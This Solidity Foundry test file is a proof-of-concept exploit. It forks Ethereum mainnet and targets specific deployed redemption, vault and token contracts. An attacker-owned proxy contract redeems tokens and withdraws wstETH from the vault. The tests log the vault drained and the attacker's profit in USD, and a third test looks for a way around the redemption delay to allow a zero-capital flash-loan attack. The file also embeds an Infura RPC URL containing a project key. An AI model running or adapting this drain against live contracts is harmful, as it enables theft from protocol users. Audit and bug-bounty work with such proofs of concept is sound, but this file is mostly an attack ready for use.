// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract CompleteProxyExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CompleteExploitViaNormalRedemption() public {
        console.log("=== COMPLETE EXPLOIT VIA NORMAL REDEMPTION ===\n");
        console.log("*** THIS IS THE 'ACTION CHAINING' PATTERN ***\n");

        // Step 1: Attacker deploys their own proxy contract
        console.log("Step 1: Deploy attacker's proxy");
        ExploitProxy proxy = new ExploitProxy(REDEMPTION_0, TASSET, wstETH);
        console.log("Proxy deployed at:", address(proxy));

        // Step 2: Give proxy TASSET to redeem
        deal(TASSET, address(proxy), 3000e18);
        console.log("Proxy TASSET balance:", IERC20(TASSET).balanceOf(address(proxy)) / 1e18);

        // Track balances
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault wstETH before:", vaultBefore / 1e18);
        console.log("Attacker wstETH before:", attackerBefore / 1e18);

        // Step 3: Proxy calls redeem (as CALLER)
        console.log("\nStep 2: Proxy initiates redemption");
        proxy.initiateRedeem(3000e18);

        // Step 4: Wait for redemption delay
        console.log("\nStep 3: Wait for redemption delay (7 days)");
        vm.warp(block.timestamp + 7 days);

        // Step 5: Proxy calls finalizeRedeem
        console.log("\nStep 4: Proxy finalizes redemption");
        proxy.finalizeRedemption(0);

        // Check where wstETH went
        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 proxyWstETH = IERC20(wstETH).balanceOf(address(proxy));

        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Proxy wstETH:", proxyWstETH / 1e18);

        // Step 6: Attacker extracts from proxy
        console.log("\nStep 5: Attacker extracts from proxy");
        proxy.withdraw(attacker);

        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== FINAL RESULTS ===");
        console.log("Vault drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        console.log("Attacker gained:", attackerAfter / 1e18, "wstETH");

        if (attackerAfter > 0) {
            console.log("\n*** EXPLOIT SUCCESSFUL! ***");
            console.log("Attacker profit: ~$", (attackerAfter / 1e18) * 2300, "USD");
        }
    }

    function test_ExploitWithMaxDrain() public {
        console.log("=== MAXIMUM DRAIN EXPLOIT ===\n");

        // Deploy proxy
        ExploitProxy proxy = new ExploitProxy(REDEMPTION_0, TASSET, wstETH);
        console.log("Proxy:", address(proxy));

        // Get max possible drain (limited by vault balance)
        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault total:", vaultBalance / 1e18, "wstETH");

        // Need equivalent TASSET to redeem
        // Redemption might have a max per tx, let's do multiple rounds

        uint256 totalExtracted = 0;

        for (uint i = 0; i < 3; i++) {
            // Give proxy TASSET
            deal(TASSET, address(proxy), 1000e18);

            // Initiate
            proxy.initiateRedeem(1000e18);
        }

        vm.warp(block.timestamp + 7 days);

        // Finalize all
        for (uint i = 0; i < 3; i++) {
            proxy.finalizeRedemption(i);
        }

        // Extract all
        uint256 proxyBalance = IERC20(wstETH).balanceOf(address(proxy));
        console.log("\nProxy accumulated:", proxyBalance / 1e18, "wstETH");

        proxy.withdraw(attacker);

        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker total:", attackerFinal / 1e18, "wstETH");
        console.log("Value: ~$", (attackerFinal / 1e18) * 2300, "USD");
    }

    function test_NoCapitalRequiredFlashloan() public {
        console.log("=== ZERO CAPITAL EXPLOIT WITH FLASHLOAN ===\n");

        // In practice, attacker could:
        // 1. Flashloan TASSET (or ETH to mint TASSET)
        // 2. Deposit through proxy
        // 3. Wait 7 days
        // 4. Finalize + repay flashloan + profit

        // However, 7 day delay means can't do in single tx
        // Unless there's a way to bypass the delay...

        console.log("Redemption has 7-day delay");
        console.log("Flash loan attack requires single tx");
        console.log("Need to find delay bypass for flash loan attack");

        // Check if there's any delay bypass
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("redemptionDelay()")
        );
        if (s1 && d1.length >= 32) {
            uint256 delay = abi.decode(d1, (uint256));
            console.log("\nRedemption delay:", delay, "seconds");
            console.log("=", delay / 86400, "days");
        }

        // Check cooldownPeriod selector we found earlier
        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0x3a2ef9df))
        );
        if (s2 && d2.length >= 32) {
            uint256 cooldown = abi.decode(d2, (uint256));
            console.log("\nCooldown period:", cooldown, "seconds");
        }
    }
}

contract ExploitProxy {
    address public redemption;
    address public tasset;
    address public wsteth;
    address public owner;

    constructor(address _redemption, address _tasset, address _wsteth) {
        redemption = _redemption;
        tasset = _tasset;
        wsteth = _wsteth;
        owner = msg.sender;
    }

    function initiateRedeem(uint96 amount) external {
        IERC20(tasset).approve(redemption, type(uint256).max);
        (bool success, ) = redemption.call(
            abi.encodeWithSignature("redeem(uint96)", amount)
        );
        require(success, "redeem failed");
    }

    function finalizeRedemption(uint256 index) external {
        (bool success, ) = redemption.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", index)
        );
        require(success, "finalize failed");
    }

    function withdraw(address to) external {
        require(msg.sender == owner, "not owner");
        uint256 balance = IERC20(wsteth).balanceOf(address(this));
        if (balance > 0) {
            IERC20(wsteth).transfer(to, balance);
        }
    }

    receive() external payable {}
}
